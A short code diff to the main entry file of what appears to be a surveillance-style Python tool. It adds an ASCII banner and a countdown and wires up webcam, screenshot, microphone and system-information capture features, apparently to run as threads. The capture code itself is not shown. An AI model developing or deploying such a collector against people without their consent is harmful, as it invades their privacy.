@@ -1,14 +1,30 @@
 import threading
-import feature
+
+import Features.feature
+from Features import feature
+
 
 class MainFileException(Exception):
     pass
 
 def main():
-    webcamera = feature.WEBCAMERA
-    screenshots = feature.SCREENSHOTS
-    microphone = feature.MICROPHONE
-    system_information = feature.SYS_INFO
+    ascii_art = """
+       _____ _____ _____     _____ _____ __  __ 
+      / ____/ ____|  __ \   / ____|_   _|  \/  |
+     | |   | |    | |__) | | (___   | | | \  / |
+     | |   | |    |  ___/   \___ \  | | | |\/| |
+     | |___| |____| |       ____) |_| |_| |  | |
+      \_____\_____|_|      |_____/|_____|_|  |_|                                  
+        """
+    print(ascii_art)
+
+    for i in range(5,0,-1):
+        print(f"Wait: {i}")
+
+    webcamera = Features.feature.WEBCAMERA
+    screenshots = Features.feature.SCREENSHOTS
+    microphone = Features.feature.MICROPHONE
+    system_information = Features.feature.SYS_INFO
 
     try:
         # Create threads for each function
